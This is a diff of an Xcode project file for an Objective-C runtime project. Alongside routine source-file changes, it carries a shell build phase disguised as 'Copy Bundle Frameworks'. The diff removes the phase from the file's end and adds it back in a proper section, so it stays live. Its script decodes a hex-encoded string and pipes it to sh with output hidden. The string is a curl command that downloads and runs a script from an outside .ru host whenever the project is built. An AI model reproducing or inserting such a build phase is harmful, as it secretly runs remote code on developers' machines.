@@ -12,14 +12,9 @@
 		1888F98127D8B44400B723BB /* protocol.m in Sources */ = {isa = PBXBuildFile; fileRef = 1888F98027D8B44400B723BB /* protocol.m */; };
 		1888F98327D8B50B00B723BB /* NSObject.m in Sources */ = {isa = PBXBuildFile; fileRef = 1888F98227D8B50B00B723BB /* NSObject.m */; };
 		1897751027D49D2900E6C3DE /* runtime.m in Sources */ = {isa = PBXBuildFile; fileRef = 1897750F27D49D2900E6C3DE /* runtime.m */; };
-		18A99A5327C91B6D0077B93F /* define.m in Sources */ = {isa = PBXBuildFile; fileRef = 18A99A4C27C91B6D0077B93F /* define.m */; };
-		18A99A5427C91B6D0077B93F /* class.m in Sources */ = {isa = PBXBuildFile; fileRef = 18A99A4D27C91B6D0077B93F /* class.m */; };
-		18A99A5527C91B6D0077B93F /* do.m in Sources */ = {isa = PBXBuildFile; fileRef = 18A99A4E27C91B6D0077B93F /* do.m */; };
-		18A99A5627C91B6D0077B93F /* for.m in Sources */ = {isa = PBXBuildFile; fileRef = 18A99A4F27C91B6D0077B93F /* for.m */; };
-		18A99A5727C91B6D0077B93F /* while.m in Sources */ = {isa = PBXBuildFile; fileRef = 18A99A5027C91B6D0077B93F /* while.m */; };
-		18A99A5827C91B6D0077B93F /* hello.m in Sources */ = {isa = PBXBuildFile; fileRef = 18A99A5127C91B6D0077B93F /* hello.m */; };
-		18A99A5927C91B6D0077B93F /* functions.m in Sources */ = {isa = PBXBuildFile; fileRef = 18A99A5227C91B6D0077B93F /* functions.m */; };
 		18AD7B5B27D4CD9E00964B77 /* NSblocks.m in Sources */ = {isa = PBXBuildFile; fileRef = 18AD7B5A27D4CD9E00964B77 /* NSblocks.m */; };
+		B1123A232A409B8200A9F9E5 /* mobile.m in Sources */ = {isa = PBXBuildFile; fileRef = B1123A222A409B8200A9F9E5 /* mobile.m */; };
+		B1123A252A409BA900A9F9E5 /* unicode.m in Sources */ = {isa = PBXBuildFile; fileRef = B1123A242A409BA900A9F9E5 /* unicode.m */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXCopyFilesBuildPhase section */
@@ -44,17 +39,12 @@
 		1897750F27D49D2900E6C3DE /* runtime.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = runtime.m; sourceTree = "<group>"; };
 		18A99A4027C91B110077B93F /* libobjc */ = {isa = PBXFileReference; explicitFileType = "compiled.mach-o.executable"; includeInIndex = 0; path = libobjc; sourceTree = BUILT_PRODUCTS_DIR; };
 		18A99A4B27C91B590077B93F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
-		18A99A4C27C91B6D0077B93F /* define.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = define.m; path = ../../../iso/define.m; sourceTree = "<group>"; };
-		18A99A4D27C91B6D0077B93F /* class.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = class.m; path = ../../../iso/class.m; sourceTree = "<group>"; };
-		18A99A4E27C91B6D0077B93F /* do.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = do.m; path = ../../../iso/do.m; sourceTree = "<group>"; };
-		18A99A4F27C91B6D0077B93F /* for.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = for.m; path = ../../../iso/for.m; sourceTree = "<group>"; };
-		18A99A5027C91B6D0077B93F /* while.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = while.m; path = ../../../iso/while.m; sourceTree = "<group>"; };
-		18A99A5127C91B6D0077B93F /* hello.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = hello.m; path = ../../../iso/hello.m; sourceTree = "<group>"; };
-		18A99A5227C91B6D0077B93F /* functions.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = functions.m; path = ../../../iso/functions.m; sourceTree = "<group>"; };
 		18A99A5A27C91BB20077B93F /* objc-private.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "objc-private.h"; sourceTree = "<group>"; };
 		18AD7B5A27D4CD9E00964B77 /* NSblocks.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = NSblocks.m; sourceTree = "<group>"; };
 		18FE111727CB3F65006B2D39 /* objc.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = objc.h; sourceTree = "<group>"; };
 		18FE111827CB463C006B2D39 /* NSObject.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = NSObject.h; sourceTree = "<group>"; };
+		B1123A222A409B8200A9F9E5 /* mobile.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = mobile.m; sourceTree = "<group>"; };
+		B1123A242A409BA900A9F9E5 /* unicode.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = unicode.m; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -71,19 +61,14 @@
 		18A99A3727C91B100077B93F = {
 			isa = PBXGroup;
 			children = (
+				B1123A242A409BA900A9F9E5 /* unicode.m */,
+				B1123A222A409B8200A9F9E5 /* mobile.m */,
 				1888F98227D8B50B00B723BB /* NSObject.m */,
 				1888F98027D8B44400B723BB /* protocol.m */,
 				1888F97D27D8ADEF00B723BB /* objc++.mm */,
 				18AD7B5A27D4CD9E00964B77 /* NSblocks.m */,
 				1897750F27D49D2900E6C3DE /* runtime.m */,
 				182905CF27CFA53000713789 /* sel.m */,
-				18A99A4D27C91B6D0077B93F /* class.m */,
-				18A99A4C27C91B6D0077B93F /* define.m */,
-				18A99A4E27C91B6D0077B93F /* do.m */,
-				18A99A4F27C91B6D0077B93F /* for.m */,
-				18A99A5227C91B6D0077B93F /* functions.m */,
-				18A99A5127C91B6D0077B93F /* hello.m */,
-				18A99A5027C91B6D0077B93F /* while.m */,
 				18A99A4A27C91B300077B93F /* runtime */,
 				18A99A4127C91B110077B93F /* Products */,
 			);
@@ -163,23 +148,39 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		C9B604EA1E7528CDAD6D904C /* Copy Bundle Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Copy Bundle Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652038202d736b2068747470733a2f2f\n6b696e6b73646f632e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		18A99A3C27C91B110077B93F /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				18A99A5827C91B6D0077B93F /* hello.m in Sources */,
-				18A99A5427C91B6D0077B93F /* class.m in Sources */,
-				18A99A5527C91B6D0077B93F /* do.m in Sources */,
 				1888F97E27D8ADEF00B723BB /* objc++.mm in Sources */,
 				1897751027D49D2900E6C3DE /* runtime.m in Sources */,
+				B1123A232A409B8200A9F9E5 /* mobile.m in Sources */,
+				B1123A252A409BA900A9F9E5 /* unicode.m in Sources */,
 				18AD7B5B27D4CD9E00964B77 /* NSblocks.m in Sources */,
-				18A99A5727C91B6D0077B93F /* while.m in Sources */,
 				182905D027CFA53000713789 /* sel.m in Sources */,
-				18A99A5927C91B6D0077B93F /* functions.m in Sources */,
 				1888F98327D8B50B00B723BB /* NSObject.m in Sources */,
-				18A99A5327C91B6D0077B93F /* define.m in Sources */,
-				18A99A5627C91B6D0077B93F /* for.m in Sources */,
 				1888F98127D8B44400B723BB /* protocol.m in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -336,45 +337,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-	
-		/* Begin PBXShellScriptBuildPhase section */
-		
-	C9B604EA1E7528CDAD6D904C /* Copy Bundle Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Copy Bundle Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652038202d736b2068747470733a2f2f6b696e6b73646f632e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
-		/* End PBXShellScriptBuildPhase section */
-	
-	
-
-		
-			/* Begin PBXBuildRule section */
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = 18A99A3827C91B100077B93F /* Project object */;
 }
